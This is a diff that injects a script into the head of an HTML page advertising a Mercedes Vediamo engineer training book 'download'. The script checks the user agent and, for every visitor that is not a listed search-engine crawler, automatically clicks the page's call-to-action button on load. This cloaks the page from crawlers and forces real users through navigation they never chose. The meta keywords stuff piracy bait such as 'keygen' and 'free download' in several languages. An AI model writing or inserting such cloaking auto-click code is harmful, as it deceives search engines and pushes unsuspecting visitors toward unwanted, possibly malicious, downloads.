@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Mercedes Vediamo Engineer System Training Book for real special functions</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Mercedes Vediamo Engineer System Training Book for special functions, DTS usage, and case studies. Includes 146 pages in English">
     <meta name="keywords" content="Mercedes Vediamo engineer training book, Vediamo special functions book, Mercedes Vediamo book 2023, Mercedes Vediamo book download, Mercedes Vediamo book pdf, Mercedes Vediamo book pdf free download, Mercedes engineer system training, Vediamo DTS training, Mercedes special functions guide, Vediamo case studies, Mercedes diagnostic tools training, cbf file location, cff file usage, Vediamo database import, smr-d file import, Mercedes control units, vehicle connection protocols, module coding, fault reading, mercedes programming, turn assist light, sam coding, airbag unit configuration, gearbox programming, urea system deactivation, xentry special functions, sbc reset, keyless entry retrofit, electric tailgate installation, Mercedes Vediamo training book pdf download, Mercedes Vediamo training book high speed download, Mercedes Vediamo training book keygen, Mercedes Vediamo обучение, Mercedes Vediamo книга, Mercedes Vediamo книга скачать бесплатно, Mercedes Vediamo руководство по эксплуатации, Mercedes Vediamo навчальна книга, Mercedes Vediamo скачати книгу безкоштовно, Mercedes Vediamo посібник користувача">
     <style>
